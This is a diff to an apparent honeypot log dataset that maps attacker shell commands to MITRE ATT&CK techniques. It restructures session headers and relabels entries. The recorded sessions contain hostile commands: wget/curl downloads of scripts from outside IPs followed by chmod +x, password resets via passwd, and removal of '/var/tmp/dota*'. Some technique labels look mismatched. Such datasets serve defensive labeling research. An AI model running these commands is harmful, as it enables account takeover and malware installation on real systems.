@@ -6184,7 +6184,7 @@ touch /tmp/foo	change file timestamps	Indicator Removal
 
 - Mapping:		Indicator Removal
 
-
+Session ID: 60c99c71fadc
 cat /proc/cpuinfo | grep name | wc -l	concatenate files and print on the standard output	Automated Collection
 echo -e "P@ssw0rds\nvxWYVEYsReeq\nvxWYVEYsReeq"|passwd|bash	display a line of text	Masquerading
 echo "P@ssw0rds\nvxWYVEYsReeq\nvxWYVEYsReeq\n"|passwd	display a line of text	Masquerading
@@ -6253,7 +6253,7 @@ touch /tmp/foo	change file timestamps	Indicator Removal
 
 - Mapping:		Indicator Removal
 
-
+Session ID: 179a56ded9d0
 cat /proc/cpuinfo | grep name | wc -l	concatenate files and print on the standard output	Automated Collection
 echo -e "adminadmin\nvyREBKU1Q1XZ\nvyREBKU1Q1XZ"|passwd|bash	display a line of text	Masquerading
 echo "adminadmin\nvyREBKU1Q1XZ\nvyREBKU1Q1XZ\n"|passwd	display a line of text	Masquerading
@@ -6301,18 +6301,13 @@ rm -rf /var/tmp/dota*	remove files or directories	Indicator Removal
 
 Session ID: e13e1b77e53e
 ls -al /tmp/foo	list directory contents	File and Directory Discovery
-
-- Mapping:		File and Directory Discovery
-
-rm /tmp/foo
-
-
-ps -x
+rm /tmp/foo	remove files or directories	Indicator Removal
+ps -x	report a snapshot of the current processes	Process Discovery
 dmesg | grep irtual	print or control the kernel ring buffer	Process Injection
 lspci | grep irti	list all PCI devices	Peripheral Device Discovery
 
-- Mapping:		Virtualization/Sandbox Evasion
-- Mapping:		Peripheral Device Discovery
+- Mapping:		File and Directory Discovery
+- Mapping:		Indicator Removal
 
 Session ID: 63a9eb6fe55f
 killall -9 perl	kill processes by name	Process Discovery
@@ -6337,7 +6332,7 @@ touch /tmp/foo	change file timestamps	Indicator Removal
 
 - Mapping:		Indicator Removal
 
-
+Session ID: 19ffa193271f
 cat /proc/cpuinfo | grep name | wc -l	concatenate files and print on the standard output	Automated Collection
 echo -e "guest\n4CfdOEMrB1RY\n4CfdOEMrB1RY"|passwd|bash	display a line of text	Masquerading
 echo "guest\n4CfdOEMrB1RY\n4CfdOEMrB1RY\n"|passwd	display a line of text	Masquerading
@@ -6406,7 +6401,7 @@ touch /tmp/foo	change file timestamps	Indicator Removal
 
 - Mapping:		Indicator Removal
 
-
+Session ID: 040c2b470a04
 cat /proc/cpuinfo | grep name | wc -l	concatenate files and print on the standard output	Automated Collection
 echo -e "guest\npLWUvSn7jlGz\npLWUvSn7jlGz"|passwd|bash	display a line of text	Masquerading
 echo "guest\npLWUvSn7jlGz\npLWUvSn7jlGz\n"|passwd	display a line of text	Masquerading
@@ -6477,18 +6472,13 @@ rm -rf /var/tmp/dota*	remove files or directories	Indicator Removal
 
 Session ID: 9caf34b6628a
 ls -al /tmp/foo	list directory contents	File and Directory Discovery
-
-- Mapping:		File and Directory Discovery
-
-rm /tmp/foo
-
-
-ps -x
+rm /tmp/foo	remove files or directories	Indicator Removal
+ps -x	report a snapshot of the current processes	Process Discovery
 dmesg | grep irtual	print or control the kernel ring buffer	Process Injection
 lspci | grep irti	list all PCI devices	Peripheral Device Discovery
 
-- Mapping:		Virtualization/Sandbox Evasion
-- Mapping:		Peripheral Device Discovery
+- Mapping:		File and Directory Discovery
+- Mapping:		Indicator Removal
 
 Session ID: 5384b641e9de
 cat /proc/cpuinfo | grep name | wc -l	concatenate files and print on the standard output	Automated Collection
@@ -6559,20 +6549,15 @@ touch /tmp/foo	change file timestamps	Indicator Removal
 
 - Mapping:		Indicator Removal
 
-
+Session ID: 974cfff7c03e
 ls -al /tmp/foo	list directory contents	File and Directory Discovery
-
-- Mapping:		File and Directory Discovery
-
-rm /tmp/foo
-
-
-ps -x
+rm /tmp/foo	remove files or directories	Indicator Removal
+ps -x	report a snapshot of the current processes	Process Discovery
 dmesg | grep irtual	print or control the kernel ring buffer	Process Injection
 lspci | grep irti	list all PCI devices	Peripheral Device Discovery
 
-- Mapping:		Virtualization/Sandbox Evasion
-- Mapping:		Peripheral Device Discovery
+- Mapping:		File and Directory Discovery
+- Mapping:		Indicator Removal
 
 Session ID: b006a85b6a0f
 killall -9 perl	kill processes by name	Process Discovery
@@ -6597,7 +6582,7 @@ touch /tmp/foo	change file timestamps	Indicator Removal
 
 - Mapping:		Indicator Removal
 
-
+Session ID: be08fe5d8c3c
 cat /proc/cpuinfo | grep name | wc -l	concatenate files and print on the standard output	Automated Collection
 echo -e "1234\n0VMV5yGXP5dU\n0VMV5yGXP5dU"|passwd|bash	display a line of text	Masquerading
 echo "1234\n0VMV5yGXP5dU\n0VMV5yGXP5dU\n"|passwd	display a line of text	Masquerading
@@ -6643,20 +6628,15 @@ touch /tmp/foo	change file timestamps	Indicator Removal
 
 - Mapping:		Indicator Removal
 
-
+Session ID: bc9c94f921a8
 ls -al /tmp/foo	list directory contents	File and Directory Discovery
-
-- Mapping:		File and Directory Discovery
-
-rm /tmp/foo
-
-
-ps -x
+rm /tmp/foo	remove files or directories	Indicator Removal
+ps -x	report a snapshot of the current processes	Process Discovery
 dmesg | grep irtual	print or control the kernel ring buffer	Process Injection
 lspci | grep irti	list all PCI devices	Peripheral Device Discovery
 
-- Mapping:		Virtualization/Sandbox Evasion
-- Mapping:		Peripheral Device Discovery
+- Mapping:		File and Directory Discovery
+- Mapping:		Indicator Removal
 
 Session ID: c33ef32e510d
 killall -9 perl	kill processes by name	Process Discovery
@@ -6681,7 +6661,7 @@ touch /tmp/foo	change file timestamps	Indicator Removal
 
 - Mapping:		Indicator Removal
 
-
+Session ID: 579c263b09d8
 killall -9 perl	kill processes by name	Process Discovery
 rm -rf ssh1.txt	remove files or directories	Indicator Removal
 wget http://185.234.217.21/ssh1.txt	The non-interactive network downloader	Ingress Tool Transfer
@@ -6704,7 +6684,7 @@ touch /tmp/foo	change file timestamps	Indicator Removal
 
 - Mapping:		Indicator Removal
 
-
+Session ID: e53f01b8a302
 killall -9 perl	kill processes by name	Process Discovery
 rm -rf ssh1.txt	remove files or directories	Indicator Removal
 wget http://185.234.217.21/ssh1.txt	The non-interactive network downloader	Ingress Tool Transfer
@@ -6727,35 +6707,25 @@ touch /tmp/foo	change file timestamps	Indicator Removal
 
 - Mapping:		Indicator Removal
 
-
+Session ID: 5a81a9960ae3
 ls -al /tmp/foo	list directory contents	File and Directory Discovery
-
-- Mapping:		File and Directory Discovery
-
-rm /tmp/foo
-
-
-ps -x
+rm /tmp/foo	remove files or directories	Indicator Removal
+ps -x	report a snapshot of the current processes	Process Discovery
 dmesg | grep irtual	print or control the kernel ring buffer	Process Injection
 lspci | grep irti	list all PCI devices	Peripheral Device Discovery
 
-- Mapping:		Virtualization/Sandbox Evasion
-- Mapping:		Peripheral Device Discovery
+- Mapping:		File and Directory Discovery
+- Mapping:		Indicator Removal
 
 Session ID: 0e14e78fd26c
 ls -al /tmp/foo	list directory contents	File and Directory Discovery
-
-- Mapping:		File and Directory Discovery
-
-rm /tmp/foo
-
-
-ps -x
+rm /tmp/foo	remove files or directories	Indicator Removal
+ps -x	report a snapshot of the current processes	Process Discovery
 dmesg | grep irtual	print or control the kernel ring buffer	Process Injection
 lspci | grep irti	list all PCI devices	Peripheral Device Discovery
 
-- Mapping:		Virtualization/Sandbox Evasion
-- Mapping:		Peripheral Device Discovery
+- Mapping:		File and Directory Discovery
+- Mapping:		Indicator Removal
 
 Session ID: 0df31ca5daf1
 killall -9 perl	kill processes by name	Process Discovery
@@ -6780,7 +6750,7 @@ touch /tmp/foo	change file timestamps	Indicator Removal
 
 - Mapping:		Indicator Removal
 
-
+Session ID: a9d29119aa92
 killall -9 perl	kill processes by name	Process Discovery
 rm -rf ssh1.txt	remove files or directories	Indicator Removal
 wget http://185.234.217.21/ssh1.txt	The non-interactive network downloader	Ingress Tool Transfer
@@ -6803,7 +6773,7 @@ touch /tmp/foo	change file timestamps	Indicator Removal
 
 - Mapping:		Indicator Removal
 
-
+Session ID: f72824a74f39
 echo "cd /tmp	display a line of text	Masquerading
 wget http://46.246.45.144/wget.sh || curl http://46.246.45.144/curl.sh -o curl.sh	The non-interactive network downloader	Ingress Tool Transfer
 chmod +x *.sh	change file mode bits	Obfuscated Files or Information
@@ -6835,33 +6805,23 @@ rm -rf /var/tmp/dota*	remove files or directories	Indicator Removal
 
 Session ID: 49a23947ce49
 ls -al /tmp/foo	list directory contents	File and Directory Discovery
-
-- Mapping:		File and Directory Discovery
-
-rm /tmp/foo
-
-
-ps -x
+rm /tmp/foo	remove files or directories	Indicator Removal
+ps -x	report a snapshot of the current processes	Process Discovery
 dmesg | grep irtual	print or control the kernel ring buffer	Process Injection
 lspci | grep irti	list all PCI devices	Peripheral Device Discovery
 
-- Mapping:		Virtualization/Sandbox Evasion
-- Mapping:		Peripheral Device Discovery
+- Mapping:		File and Directory Discovery
+- Mapping:		Indicator Removal
 
 Session ID: 8cf08636e2c1
 ls -al /tmp/foo	list directory contents	File and Directory Discovery
-
-- Mapping:		File and Directory Discovery
-
-rm /tmp/foo
-
-
-ps -x
+rm /tmp/foo	remove files or directories	Indicator Removal
+ps -x	report a snapshot of the current processes	Process Discovery
 dmesg | grep irtual	print or control the kernel ring buffer	Process Injection
 lspci | grep irti	list all PCI devices	Peripheral Device Discovery
 
-- Mapping:		Virtualization/Sandbox Evasion
-- Mapping:		Peripheral Device Discovery
+- Mapping:		File and Directory Discovery
+- Mapping:		Indicator Removal
 
 Session ID: 7e00c135f0a8
 killall -9 perl	kill processes by name	Process Discovery
@@ -6886,7 +6846,7 @@ touch /tmp/foo	change file timestamps	Indicator Removal
 
 - Mapping:		Indicator Removal
 
-
+Session ID: b5a4c3559a27
 killall -9 perl	kill processes by name	Process Discovery
 rm -rf ssh1.txt	remove files or directories	Indicator Removal
 wget http://185.234.217.21/ssh1.txt	The non-interactive network downloader	Ingress Tool Transfer
@@ -6909,7 +6869,7 @@ touch /tmp/foo	change file timestamps	Indicator Removal
 
 - Mapping:		Indicator Removal
 
-
+Session ID: 30ab63b72d1a
 echo "cd /tmp	display a line of text	Masquerading
 wget http://46.246.45.144/wget.sh || curl http://46.246.45.144/curl.sh -o curl.sh	The non-interactive network downloader	Ingress Tool Transfer
 chmod +x *.sh	change file mode bits	Obfuscated Files or Information
@@ -6976,7 +6936,7 @@ touch /tmp/foo	change file timestamps	Indicator Removal
 
 - Mapping:		Indicator Removal
 
-
+Session ID: 388dcff6ed9e
 cat /proc/cpuinfo | grep name | wc -l	concatenate files and print on the standard output	Automated Collection
 echo -e "(none)\n4r5qJ9JdozOu\n4r5qJ9JdozOu"|passwd|bash	display a line of text	Masquerading
 echo "(none)\n4r5qJ9JdozOu\n4r5qJ9JdozOu\n"|passwd	display a line of text	Masquerading
@@ -7001,18 +6961,13 @@ rm -rf /var/tmp/dota*	remove files or directories	Indicator Removal
 
 Session ID: fcde4b77ad9a
 ls -al /tmp/foo	list directory contents	File and Directory Discovery
-
-- Mapping:		File and Directory Discovery
-
-rm /tmp/foo
-
-
-ps -x
+rm /tmp/foo	remove files or directories	Indicator Removal
+ps -x	report a snapshot of the current processes	Process Discovery
 dmesg | grep irtual	print or control the kernel ring buffer	Process Injection
 lspci | grep irti	list all PCI devices	Peripheral Device Discovery
 
-- Mapping:		Virtualization/Sandbox Evasion
-- Mapping:		Peripheral Device Discovery
+- Mapping:		File and Directory Discovery
+- Mapping:		Indicator Removal
 
 Session ID: 50594aad5377
 cat /proc/cpuinfo | grep name | wc -l	concatenate files and print on the standard output	Automated Collection
@@ -7060,7 +7015,7 @@ touch /tmp/foo	change file timestamps	Indicator Removal
 
 - Mapping:		Indicator Removal
 
-
+Session ID: 971d309c9e2c
 cat /proc/cpuinfo | grep name | wc -l	concatenate files and print on the standard output	Automated Collection
 echo -e "administrator\nqtZziWQkwuFO\nqtZziWQkwuFO"|passwd|bash	display a line of text	Masquerading
 echo "administrator\nqtZziWQkwuFO\nqtZziWQkwuFO\n"|passwd	display a line of text	Masquerading
@@ -7115,26 +7070,19 @@ rm -rf /var/tmp/dota*	remove files or directories	Indicator Removal
 
 Session ID: 1970365a2fd8
 ls -al /tmp/foo	list directory contents	File and Directory Discovery
+rm /tmp/foo	remove files or directories	Indicator Removal
 
-- Mapping:		File and Directory Discovery
+- Mapping:		Indicator Removal
 
-rm /tmp/foo
-
-
-
+Session ID: 4cf760b90aaf
 ls -al /tmp/foo	list directory contents	File and Directory Discovery
-
-- Mapping:		File and Directory Discovery
-
-rm /tmp/foo
-
-
-ps -x
+rm /tmp/foo	remove files or directories	Indicator Removal
+ps -x	report a snapshot of the current processes	Process Discovery
 dmesg | grep irtual	print or control the kernel ring buffer	Process Injection
 lspci | grep irti	list all PCI devices	Peripheral Device Discovery
 
-- Mapping:		Virtualization/Sandbox Evasion
-- Mapping:		Peripheral Device Discovery
+- Mapping:		File and Directory Discovery
+- Mapping:		Indicator Removal
 
 Session ID: 99c62c6e4a1b
 echo "cd /tmp	display a line of text	Masquerading
@@ -7168,13 +7116,11 @@ rm -rf /var/tmp/dota*	remove files or directories	Indicator Removal
 
 Session ID: 3cd12e5506d7
 ls -al /tmp/foo	list directory contents	File and Directory Discovery
+rm /tmp/foo	remove files or directories	Indicator Removal
 
-- Mapping:		File and Directory Discovery
+- Mapping:		Indicator Removal
 
-rm /tmp/foo
-
-
-
+Session ID: e1cfaee5f835
 killall -9 perl	kill processes by name	Process Discovery
 rm -rf ssh1.txt	remove files or directories	Indicator Removal
 wget http://185.234.217.21/ssh1.txt	The non-interactive network downloader	Ingress Tool Transfer
@@ -7197,20 +7143,15 @@ touch /tmp/foo	change file timestamps	Indicator Removal
 
 - Mapping:		Indicator Removal
 
-
+Session ID: 4a1f7ec64220
 ls -al /tmp/foo	list directory contents	File and Directory Discovery
-
-- Mapping:		File and Directory Discovery
-
-rm /tmp/foo
-
-
-ps -x
+rm /tmp/foo	remove files or directories	Indicator Removal
+ps -x	report a snapshot of the current processes	Process Discovery
 dmesg | grep irtual	print or control the kernel ring buffer	Process Injection
 lspci | grep irti	list all PCI devices	Peripheral Device Discovery
 
-- Mapping:		Virtualization/Sandbox Evasion
-- Mapping:		Peripheral Device Discovery
+- Mapping:		File and Directory Discovery
+- Mapping:		Indicator Removal
 
 Session ID: 3c35da104b3b
 cat /proc/cpuinfo | grep name | wc -l	concatenate files and print on the standard output	Automated Collection
@@ -7258,7 +7199,7 @@ touch /tmp/foo	change file timestamps	Indicator Removal
 
 - Mapping:		Indicator Removal
 
-
+Session ID: 0e005bf41b1a
 killall -9 perl	kill processes by name	Process Discovery
 rm -rf ssh1.txt	remove files or directories	Indicator Removal
 wget http://185.234.217.21/ssh1.txt	The non-interactive network downloader	Ingress Tool Transfer
@@ -7281,7 +7222,7 @@ touch /tmp/foo	change file timestamps	Indicator Removal
 
 - Mapping:		Indicator Removal
 
-
+Session ID: e8e0058bdb14
 killall -9 perl	kill processes by name	Process Discovery
 rm -rf ssh1.txt	remove files or directories	Indicator Removal
 wget http://185.234.217.21/ssh1.txt	The non-interactive network downloader	Ingress Tool Transfer
@@ -7304,7 +7245,7 @@ touch /tmp/foo	change file timestamps	Indicator Removal
 
 - Mapping:		Indicator Removal
 
-
+Session ID: 5a1d37d0b135
 cat /proc/cpuinfo | grep name | wc -l	concatenate files and print on the standard output	Automated Collection
 echo -e "1q2w3e\nUfjEmsK0bM80\nUfjEmsK0bM80"|passwd|bash	display a line of text	Masquerading
 echo "1q2w3e\nUfjEmsK0bM80\nUfjEmsK0bM80\n"|passwd	display a line of text	Masquerading
@@ -7350,20 +7291,15 @@ touch /tmp/foo	change file timestamps	Indicator Removal
 
 - Mapping:		Indicator Removal
 
-
+Session ID: b85372493f22
 ls -al /tmp/foo	list directory contents	File and Directory Discovery
-
-- Mapping:		File and Directory Discovery
-
-rm /tmp/foo
-
-
-ps -x
+rm /tmp/foo	remove files or directories	Indicator Removal
+ps -x	report a snapshot of the current processes	Process Discovery
 dmesg | grep irtual	print or control the kernel ring buffer	Process Injection
 lspci | grep irti	list all PCI devices	Peripheral Device Discovery
 
-- Mapping:		Virtualization/Sandbox Evasion
-- Mapping:		Peripheral Device Discovery
+- Mapping:		File and Directory Discovery
+- Mapping:		Indicator Removal
 
 Session ID: cb6bebfa61e2
 killall -9 perl	kill processes by name	Process Discovery
@@ -7388,20 +7324,15 @@ touch /tmp/foo	change file timestamps	Indicator Removal
 
 - Mapping:		Indicator Removal
 
-
+Session ID: 97ce663a4b7f
 ls -al /tmp/foo	list directory contents	File and Directory Discovery
-
-- Mapping:		File and Directory Discovery
-
-rm /tmp/foo
-
-
-ps -x
+rm /tmp/foo	remove files or directories	Indicator Removal
+ps -x	report a snapshot of the current processes	Process Discovery
 dmesg | grep irtual	print or control the kernel ring buffer	Process Injection
 lspci | grep irti	list all PCI devices	Peripheral Device Discovery
 
-- Mapping:		Virtualization/Sandbox Evasion
-- Mapping:		Peripheral Device Discovery
+- Mapping:		File and Directory Discovery
+- Mapping:		Indicator Removal
 
 Session ID: 6c032abca98a
 cat /proc/cpuinfo | grep name | wc -l	concatenate files and print on the standard output	Automated Collection
@@ -7428,33 +7359,23 @@ rm -rf /var/tmp/dota*	remove files or directories	Indicator Removal
 
 Session ID: 3e8e0daaa373
 ls -al /tmp/foo	list directory contents	File and Directory Discovery
-
-- Mapping:		File and Directory Discovery
-
-rm /tmp/foo
-
-
-ps -x
+rm /tmp/foo	remove files or directories	Indicator Removal
+ps -x	report a snapshot of the current processes	Process Discovery
 dmesg | grep irtual	print or control the kernel ring buffer	Process Injection
 lspci | grep irti	list all PCI devices	Peripheral Device Discovery
 
-- Mapping:		Virtualization/Sandbox Evasion
-- Mapping:		Peripheral Device Discovery
+- Mapping:		File and Directory Discovery
+- Mapping:		Indicator Removal
 
 Session ID: 6afc97b96d79
 ls -al /tmp/foo	list directory contents	File and Directory Discovery
-
-- Mapping:		File and Directory Discovery
-
-rm /tmp/foo
-
-
-ps -x
+rm /tmp/foo	remove files or directories	Indicator Removal
+ps -x	report a snapshot of the current processes	Process Discovery
 dmesg | grep irtual	print or control the kernel ring buffer	Process Injection
 lspci | grep irti	list all PCI devices	Peripheral Device Discovery
 
-- Mapping:		Virtualization/Sandbox Evasion
-- Mapping:		Peripheral Device Discovery
+- Mapping:		File and Directory Discovery
+- Mapping:		Indicator Removal
 
 Session ID: d5b39851cfd3
 killall -9 perl	kill processes by name	Process Discovery
@@ -7479,7 +7400,7 @@ touch /tmp/foo	change file timestamps	Indicator Removal
 
 - Mapping:		Indicator Removal
 
-
+Session ID: 0ff66aed0c91
 cat /proc/cpuinfo | grep name | wc -l	concatenate files and print on the standard output	Automated Collection
 echo -e "1234qwer\nJCdUhNPdHTww\nJCdUhNPdHTww"|passwd|bash	display a line of text	Masquerading
 echo "1234qwer\nJCdUhNPdHTww\nJCdUhNPdHTww\n"|passwd	display a line of text	Masquerading
@@ -7504,18 +7425,13 @@ rm -rf /var/tmp/dota*	remove files or directories	Indicator Removal
 
 Session ID: d77bfa6a9da5
 ls -al /tmp/foo	list directory contents	File and Directory Discovery
-
-- Mapping:		File and Directory Discovery
-
-rm /tmp/foo
-
-
-ps -x
+rm /tmp/foo	remove files or directories	Indicator Removal
+ps -x	report a snapshot of the current processes	Process Discovery
 dmesg | grep irtual	print or control the kernel ring buffer	Process Injection
 lspci | grep irti	list all PCI devices	Peripheral Device Discovery
 
-- Mapping:		Virtualization/Sandbox Evasion
-- Mapping:		Peripheral Device Discovery
+- Mapping:		File and Directory Discovery
+- Mapping:		Indicator Removal
 
 Session ID: 5ab72cfc0127
 cat /proc/cpuinfo | grep name | wc -l	concatenate files and print on the standard output	Automated Collection
@@ -7563,20 +7479,15 @@ touch /tmp/foo	change file timestamps	Indicator Removal
 
 - Mapping:		Indicator Removal
 
-
+Session ID: a1e282cbaf8c
 ls -al /tmp/foo	list directory contents	File and Directory Discovery
-
-- Mapping:		File and Directory Discovery
-
-rm /tmp/foo
-
-
-ps -x
+rm /tmp/foo	remove files or directories	Indicator Removal
+ps -x	report a snapshot of the current processes	Process Discovery
 dmesg | grep irtual	print or control the kernel ring buffer	Process Injection
 lspci | grep irti	list all PCI devices	Peripheral Device Discovery
 
-- Mapping:		Virtualization/Sandbox Evasion
-- Mapping:		Peripheral Device Discovery
+- Mapping:		File and Directory Discovery
+- Mapping:		Indicator Removal
 
 Session ID: 2f6988754915
 killall -9 perl	kill processes by name	Process Discovery
@@ -7601,7 +7512,7 @@ touch /tmp/foo	change file timestamps	Indicator Removal
 
 - Mapping:		Indicator Removal
 
-
+Session ID: 18da155051ef
 killall -9 perl	kill processes by name	Process Discovery
 rm -rf ssh1.txt	remove files or directories	Indicator Removal
 wget http://185.234.217.21/ssh1.txt	The non-interactive network downloader	Ingress Tool Transfer
@@ -7624,7 +7535,7 @@ touch /tmp/foo	change file timestamps	Indicator Removal
 
 - Mapping:		Indicator Removal
 
-
+Session ID: 4731dbb3362f
 cat /proc/cpuinfo | grep name | wc -l	concatenate files and print on the standard output	Automated Collection
 echo -e "P@ssw0rd!\nJHH1dBGB4j6w\nJHH1dBGB4j6w"|passwd|bash	display a line of text	Masquerading
 echo "P@ssw0rd!\nJHH1dBGB4j6w\nJHH1dBGB4j6w\n"|passwd	display a line of text	Masquerading
@@ -7695,18 +7606,13 @@ rm -rf /var/tmp/dota*	remove files or directories	Indicator Removal
 
 Session ID: 97fd33804f59
 ls -al /tmp/foo	list directory contents	File and Directory Discovery
-
-- Mapping:		File and Directory Discovery
-
-rm /tmp/foo
-
-
-ps -x
+rm /tmp/foo	remove files or directories	Indicator Removal
+ps -x	report a snapshot of the current processes	Process Discovery
 dmesg | grep irtual	print or control the kernel ring buffer	Process Injection
 lspci | grep irti	list all PCI devices	Peripheral Device Discovery
 
-- Mapping:		Virtualization/Sandbox Evasion
-- Mapping:		Peripheral Device Discovery
+- Mapping:		File and Directory Discovery
+- Mapping:		Indicator Removal
 
 Session ID: a7847e30bae6
 killall -9 perl	kill processes by name	Process Discovery
@@ -7731,35 +7637,25 @@ touch /tmp/foo	change file timestamps	Indicator Removal
 
 - Mapping:		Indicator Removal
 
-
+Session ID: b7f99b302e4e
 ls -al /tmp/foo	list directory contents	File and Directory Discovery
-
-- Mapping:		File and Directory Discovery
-
-rm /tmp/foo
-
-
-ps -x
+rm /tmp/foo	remove files or directories	Indicator Removal
+ps -x	report a snapshot of the current processes	Process Discovery
 dmesg | grep irtual	print or control the kernel ring buffer	Process Injection
 lspci | grep irti	list all PCI devices	Peripheral Device Discovery
 
-- Mapping:		Virtualization/Sandbox Evasion
-- Mapping:		Peripheral Device Discovery
+- Mapping:		File and Directory Discovery
+- Mapping:		Indicator Removal
 
 Session ID: 45bed116f20b
 ls -al /tmp/foo	list directory contents	File and Directory Discovery
-
-- Mapping:		File and Directory Discovery
-
-rm /tmp/foo
-
-
-ps -x
+rm /tmp/foo	remove files or directories	Indicator Removal
+ps -x	report a snapshot of the current processes	Process Discovery
 dmesg | grep irtual	print or control the kernel ring buffer	Process Injection
 lspci | grep irti	list all PCI devices	Peripheral Device Discovery
 
-- Mapping:		Virtualization/Sandbox Evasion
-- Mapping:		Peripheral Device Discovery
+- Mapping:		File and Directory Discovery
+- Mapping:		Indicator Removal
 
 Session ID: b72121060831
 killall -9 perl	kill processes by name	Process Discovery
@@ -7784,20 +7680,15 @@ touch /tmp/foo	change file timestamps	Indicator Removal
 
 - Mapping:		Indicator Removal
 
-
+Session ID: 52cdeb8b2896
 ls -al /tmp/foo	list directory contents	File and Directory Discovery
-
-- Mapping:		File and Directory Discovery
-
-rm /tmp/foo
-
-
-ps -x
+rm /tmp/foo	remove files or directories	Indicator Removal
+ps -x	report a snapshot of the current processes	Process Discovery
 dmesg | grep irtual	print or control the kernel ring buffer	Process Injection
 lspci | grep irti	list all PCI devices	Peripheral Device Discovery
 
-- Mapping:		Virtualization/Sandbox Evasion
-- Mapping:		Peripheral Device Discovery
+- Mapping:		File and Directory Discovery
+- Mapping:		Indicator Removal
 
 Session ID: 22881fc9cb4a
 killall -9 perl	kill processes by name	Process Discovery
@@ -7822,15 +7713,13 @@ touch /tmp/foo	change file timestamps	Indicator Removal
 
 - Mapping:		Indicator Removal
 
-
+Session ID: 9014fb3635b0
 ls -al /tmp/foo	list directory contents	File and Directory Discovery
+rm /tmp/foo	remove files or directories	Indicator Removal
 
-- Mapping:		File and Directory Discovery
+- Mapping:		Indicator Removal
 
-rm /tmp/foo
-
-
-
+Session ID: 27722f1b34de
 killall -9 perl	kill processes by name	Process Discovery
 rm -rf ssh1.txt	remove files or directories	Indicator Removal
 wget http://185.234.217.21/ssh1.txt	The non-interactive network downloader	Ingress Tool Transfer
@@ -7853,20 +7742,15 @@ touch /tmp/foo	change file timestamps	Indicator Removal
 
 - Mapping:		Indicator Removal
 
-
+Session ID: 91495b8a80eb
 ls -al /tmp/foo	list directory contents	File and Directory Discovery
-
-- Mapping:		File and Directory Discovery
-
-rm /tmp/foo
-
-
-ps -x
+rm /tmp/foo	remove files or directories	Indicator Removal
+ps -x	report a snapshot of the current processes	Process Discovery
 dmesg | grep irtual	print or control the kernel ring buffer	Process Injection
 lspci | grep irti	list all PCI devices	Peripheral Device Discovery
 
-- Mapping:		Virtualization/Sandbox Evasion
-- Mapping:		Peripheral Device Discovery
+- Mapping:		File and Directory Discovery
+- Mapping:		Indicator Removal
 
 Session ID: a57657e6af62
 cat /proc/cpuinfo | grep name | wc -l	concatenate files and print on the standard output	Automated Collection
@@ -7893,48 +7777,33 @@ rm -rf /var/tmp/dota*	remove files or directories	Indicator Removal
 
 Session ID: b732725d9aa8
 ls -al /tmp/foo	list directory contents	File and Directory Discovery
-
-- Mapping:		File and Directory Discovery
-
-rm /tmp/foo
-
-
-ps -x
+rm /tmp/foo	remove files or directories	Indicator Removal
+ps -x	report a snapshot of the current processes	Process Discovery
 dmesg | grep irtual	print or control the kernel ring buffer	Process Injection
 lspci | grep irti	list all PCI devices	Peripheral Device Discovery
 
-- Mapping:		Virtualization/Sandbox Evasion
-- Mapping:		Peripheral Device Discovery
+- Mapping:		File and Directory Discovery
+- Mapping:		Indicator Removal
 
 Session ID: f62dc7be7a2b
 ls -al /tmp/foo	list directory contents	File and Directory Discovery
-
-- Mapping:		File and Directory Discovery
-
-rm /tmp/foo
-
-
-ps -x
+rm /tmp/foo	remove files or directories	Indicator Removal
+ps -x	report a snapshot of the current processes	Process Discovery
 dmesg | grep irtual	print or control the kernel ring buffer	Process Injection
 lspci | grep irti	list all PCI devices	Peripheral Device Discovery
 
-- Mapping:		Virtualization/Sandbox Evasion
-- Mapping:		Peripheral Device Discovery
+- Mapping:		File and Directory Discovery
+- Mapping:		Indicator Removal
 
 Session ID: 392a78d161a0
 ls -al /tmp/foo	list directory contents	File and Directory Discovery
-
-- Mapping:		File and Directory Discovery
-
-rm /tmp/foo
-
-
-ps -x
+rm /tmp/foo	remove files or directories	Indicator Removal
+ps -x	report a snapshot of the current processes	Process Discovery
 dmesg | grep irtual	print or control the kernel ring buffer	Process Injection
 lspci | grep irti	list all PCI devices	Peripheral Device Discovery
 
-- Mapping:		Virtualization/Sandbox Evasion
-- Mapping:		Peripheral Device Discovery
+- Mapping:		File and Directory Discovery
+- Mapping:		Indicator Removal
 
 Session ID: b06c2f3a9057
 killall -9 perl	kill processes by name	Process Discovery
@@ -7959,7 +7828,7 @@ touch /tmp/foo	change file timestamps	Indicator Removal
 
 - Mapping:		Indicator Removal
 
-
+Session ID: 86e9e74f9583
 cat /proc/cpuinfo | grep name | wc -l	concatenate files and print on the standard output	Automated Collection
 echo -e "P@ssw0rd!\nJHH1dBGB4j6w\nJHH1dBGB4j6w"|passwd|bash	display a line of text	Masquerading
 echo "P@ssw0rd!\nJHH1dBGB4j6w\nJHH1dBGB4j6w\n"|passwd	display a line of text	Masquerading
@@ -8005,7 +7874,7 @@ touch /tmp/foo	change file timestamps	Indicator Removal
 
 - Mapping:		Indicator Removal
 
-
+Session ID: 99303f4764e8
 cat /proc/cpuinfo | grep name | wc -l	concatenate files and print on the standard output	Automated Collection
 echo -e "admin12345\njgTjUqcwzLqm\njgTjUqcwzLqm"|passwd|bash	display a line of text	Masquerading
 echo "admin12345\njgTjUqcwzLqm\njgTjUqcwzLqm\n"|passwd	display a line of text	Masquerading
@@ -8030,18 +7899,13 @@ rm -rf /var/tmp/dota*	remove files or directories	Indicator Removal
 
 Session ID: 8ce9c30ae37c
 ls -al /tmp/foo	list directory contents	File and Directory Discovery
-
-- Mapping:		File and Directory Discovery
-
-rm /tmp/foo
-
-
-ps -x
+rm /tmp/foo	remove files or directories	Indicator Removal
+ps -x	report a snapshot of the current processes	Process Discovery
 dmesg | grep irtual	print or control the kernel ring buffer	Process Injection
 lspci | grep irti	list all PCI devices	Peripheral Device Discovery
 
-- Mapping:		Virtualization/Sandbox Evasion
-- Mapping:		Peripheral Device Discovery
+- Mapping:		File and Directory Discovery
+- Mapping:		Indicator Removal
 
 Session ID: 68d535caba05
 killall -9 perl	kill processes by name	Process Discovery
@@ -8066,20 +7930,15 @@ touch /tmp/foo	change file timestamps	Indicator Removal
 
 - Mapping:		Indicator Removal
 
-
+Session ID: a7e46417bc08
 ls -al /tmp/foo	list directory contents	File and Directory Discovery
-
-- Mapping:		File and Directory Discovery
-
-rm /tmp/foo
-
-
-ps -x
+rm /tmp/foo	remove files or directories	Indicator Removal
+ps -x	report a snapshot of the current processes	Process Discovery
 dmesg | grep irtual	print or control the kernel ring buffer	Process Injection
 lspci | grep irti	list all PCI devices	Peripheral Device Discovery
 
-- Mapping:		Virtualization/Sandbox Evasion
-- Mapping:		Peripheral Device Discovery
+- Mapping:		File and Directory Discovery
+- Mapping:		Indicator Removal
 
 Session ID: cead5353491b
 killall -9 perl	kill processes by name	Process Discovery
